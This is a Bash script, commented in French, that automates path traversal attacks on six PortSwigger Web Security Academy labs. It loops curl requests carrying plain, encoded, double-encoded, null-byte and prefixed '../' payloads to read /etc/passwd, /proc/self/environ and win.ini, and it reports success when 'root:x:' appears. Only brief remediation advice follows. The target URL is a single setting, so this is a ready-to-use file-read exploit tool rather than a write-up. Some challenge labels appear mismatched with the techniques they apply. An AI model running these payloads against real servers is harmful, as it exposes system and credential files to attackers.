#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
ENDPOINT="/image?filename="
TARGET_FILES=("/etc/passwd" "/proc/self/environ" "windows/win.ini")
PREFIXES=("" "images" "/var/www/images" "static")
MAX_DEPTH=12
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

encode_traversal() {
    # $1: nombre de ../ à concaténer, $2: type d'encodage
    local depth=$1
    local encoding=$2
    local seq=""
    case $encoding in
        plain)
            for ((i=0; i<depth; i++)); do seq+="../"; done
            ;;
        url)
            for ((i=0; i<depth; i++)); do seq+="%2e%2e%2f"; done
            ;;
        double_url)
            for ((i=0; i<depth; i++)); do seq+="%252e%252e%252f"; done
            ;;
        non_recursive)
            for ((i=0; i<depth; i++)); do seq+="....//"; done
            ;;
        *)
            for ((i=0; i<depth; i++)); do seq+="../"; done
            ;;
    esac
    echo -n "$seq"
}

# 1. Challenge 1 : File path traversal
challenge_classic_traversal() {
    print_sep
    echo "[Challenge 1] File path traversal (../) – récursif"
    found=0
    for file in "${TARGET_FILES[@]}"; do
        for ((depth=1; depth<=MAX_DEPTH; depth++)); do
            traversal=$(encode_traversal $depth "plain")
            payload="${traversal}${file}"
            url="$TARGET_URL$ENDPOINT$payload"
            resp=$(curl -sk "$url")
            echo "  [Test] $payload"
            if echo "$resp" | grep -q "root:x:"; then
                echo "  [+] Succès : $payload"
                echo "$resp" | grep "root:x:" | head -n 3
                found=1
                break 2
            fi
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec le vecteur classique ../"
}

# 2. Challenge 2 : File path traversal, traversal sequences blocked with non-recursive filters
challenge_non_recursive_traversal() {
    print_sep
    echo "[Challenge 2] File path traversal, traversal sequences blocked with non-recursive filters (....//) – récursif"
    found=0
    for file in "${TARGET_FILES[@]}"; do
        for ((depth=1; depth<=MAX_DEPTH; depth++)); do
            traversal=$(encode_traversal $depth "non_recursive")
            payload="${traversal}${file}"
            url="$TARGET_URL$ENDPOINT$payload"
            resp=$(curl -sk "$url")
            echo "  [Test] $payload"
            if echo "$resp" | grep -q "root:x:"; then
                echo "  [+] Succès : $payload"
                echo "$resp" | grep "root:x:" | head -n 3
                found=1
                break 2
            fi
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec le vecteur non-récursif ....//"
}

# 3. Challenge 3 : File path traversal, validation of file extension with null byte bypass
challenge_null_byte_bypass() {
    print_sep
    echo "[Challenge 3] File path traversal, validation of file extension with null byte bypass – récursif"
    found=0
    for file in "${TARGET_FILES[@]}"; do
        for ((depth=1; depth<=MAX_DEPTH; depth++)); do
            traversal=$(encode_traversal $depth "plain")
            payload="${traversal}${file}%00.jpg"
            url="$TARGET_URL$ENDPOINT$payload"
            resp=$(curl -sk "$url")
            echo "  [Test] $payload"
            if echo "$resp" | grep -q "root:x:"; then
                echo "  [+] Succès : $payload"
                echo "$resp" | grep "root:x:" | head -n 3
                found=1
                break 2
            fi
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec le bypass null byte."
}

# 4. Challenge 4 : File path traversal, double URL-encoding
challenge_double_encoding_traversal() {
    print_sep
    echo "[Challenge 4] File path traversal, double URL-encoding (%252e%252e%252f) – récursif"
    found=0
    for file in "${TARGET_FILES[@]}"; do
        for ((depth=1; depth<=MAX_DEPTH; depth++)); do
            traversal=$(encode_traversal $depth "double_url")
            payload="${traversal}${file}"
            url="$TARGET_URL$ENDPOINT$payload"
            resp=$(curl -sk "$url")
            echo "  [Test] $payload"
            if echo "$resp" | grep -q "root:x:"; then
                echo "  [+] Succès : $payload"
                echo "$resp" | grep "root:x:" | head -n 3
                found=1
                break 2
            fi
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec le double encodage."
}

# 5. Challenge 5 : File path traversal, traversal sequences stripped non-recursively
challenge_url_encoding_traversal() {
    print_sep
    echo "[Challenge 5] File path traversal, traversal sequences stripped non-recursively (%2e%2e%2f) – récursif"
    found=0
    for file in "${TARGET_FILES[@]}"; do
        for ((depth=1; depth<=MAX_DEPTH; depth++)); do
            traversal=$(encode_traversal $depth "url")
            payload="${traversal}${file}"
            url="$TARGET_URL$ENDPOINT$payload"
            resp=$(curl -sk "$url")
            echo "  [Test] $payload"
            if echo "$resp" | grep -q "root:x:"; then
                echo "  [+] Succès : $payload"
                echo "$resp" | grep "root:x:" | head -n 3
                found=1
                break 2
            fi
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec l'encodage URL simple."
}

# 6. Challenge 6 : File path traversal, restricted to a subdirectory
challenge_prefix_traversal() {
    print_sep
    echo "[Challenge 6] File path traversal, restricted to a subdirectory (préfixe obligatoire) – récursif"
    found=0
    for prefix in "${PREFIXES[@]}"; do
        for file in "${TARGET_FILES[@]}"; do
            for ((depth=1; depth<=MAX_DEPTH; depth++)); do
                traversal=$(encode_traversal $depth "plain")
                [[ -n "$prefix" ]] && prefix_slash="$prefix/" || prefix_slash=""
                payload="${prefix_slash}${traversal}${file}"
                url="$TARGET_URL$ENDPOINT$payload"
                resp=$(curl -sk "$url")
                echo "  [Test] $payload"
                if echo "$resp" | grep -q "root:x:"; then
                    echo "  [+] Succès : $payload"
                    echo "$resp" | grep "root:x:" | head -n 3
                    found=1
                    break 3
                fi
            done
        done
    done
    [[ $found -eq 0 ]] && echo "  [-] Aucun succès avec préfixe obligatoire."
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Utilisez des fonctions de résolution de chemin sécurisées (ex: realpath)."
    echo "- Bloquez toute séquence ../, encodée ou non, et vérifiez le chemin final."
    echo "- Ne permettez jamais à l'utilisateur de choisir un chemin absolu ou relatif librement."
    echo "- Pour les labs PortSwigger, testez toutes les profondeurs, encodages, et préfixes."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/file-path-traversal"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. 6 challenges path traversal PortSwigger :"
    echo "   - File path traversal"
    echo "   - File path traversal, traversal sequences blocked with non-recursive filters"
    echo "   - File path traversal, validation of file extension with null byte bypass"
    echo "   - File path traversal, double URL-encoding"
    echo "   - File path traversal, traversal sequences stripped non-recursively"
    echo "   - File path traversal, restricted to a subdirectory"
    echo "2. Tous les tests sont récursifs (profondeur variable)."
    echo "3. Contrôle automatique du contenu (ex: root:x:)."
    echo "4. Conseils de remédiation PortSwigger."
    print_sep
}

echo "=== Script PortSwigger Path Traversal (6 challenges, récursif, noms officiels) ==="
challenge_classic_traversal
challenge_non_recursive_traversal
challenge_null_byte_bypass
challenge_double_encoding_traversal
challenge_url_encoding_traversal
challenge_prefix_traversal
print_remediation
print_summary

# End of script
